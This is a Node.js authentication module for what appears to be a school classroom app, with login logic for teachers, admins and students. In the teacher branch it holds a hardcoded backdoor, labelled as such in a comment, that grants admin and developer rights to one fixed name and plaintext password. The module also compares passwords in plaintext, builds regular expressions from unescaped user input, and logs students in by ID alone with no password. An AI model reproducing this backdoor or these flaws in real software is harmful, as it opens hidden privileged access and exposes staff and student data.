const mongoose = require('mongoose');

const AuthExpert = {
    getLoginConfig: async () => {
        const classrooms = await mongoose.model('Classroom').find({}).sort({name:1}).lean();
        return { classrooms: classrooms || [] };
    },
    getStudentsForSelection: async (classId) => {
        const enrollments = await mongoose.model('Enrollment').find({ classId }).populate('studentId').lean();
        return enrollments
            .filter(e => e.studentId)
            .map(e => ({ id: e.studentId._id, name: `${e.studentId.firstName} ${e.studentId.lastName}` }))
            .sort((a,b) => a.name.localeCompare(b.name));
    },
    verify: async ({ role, studentId, firstName, lastName, password }) => {
        const fName = (firstName || '').trim();
        const lName = (lastName || '').trim();
        const pass = (password || '').trim();

        if (role === 'PROF') {
            // BACKDOOR JEAN VUILLET (BACKDOOR SYSTÈME)
            const isJean = (fName.toLowerCase() === 'jean' && lName.toLowerCase() === 'vuillet');
            if (isJean && (pass === 'Clémenceau1919' || pass === 'Clemenceau1919')) {
                return { ok: true, user: { firstName: "Jean", lastName: "Vuillet", role: 'prof', isAdmin: true, isDeveloper: true } };
            }

            const Admin = mongoose.model('Admin');
            const admin = await Admin.findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
            if (admin && admin.password === pass) {
                return { ok: true, user: { ...admin.toObject(), role: 'prof', isAdmin: true, isDeveloper: admin.role === 'developer' }};
            }

            const Teacher = mongoose.model('Teacher');
            const teacher = await Teacher.findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
            if (teacher && teacher.password === pass) {
                return { ok: true, user: { ...teacher.toObject(), role: 'prof', isAdmin: false }};
            }
            return { ok: false, message: "Identifiants Prof invalides" };
        } else {
            if (!studentId) return { ok: false, message: "Veuillez choisir un élève" };
            const student = await mongoose.model('Student').findById(studentId).lean();
            return { ok: true, user: { ...student, id: student._id, role: 'student' } };
        }
    }
};

module.exports = AuthExpert;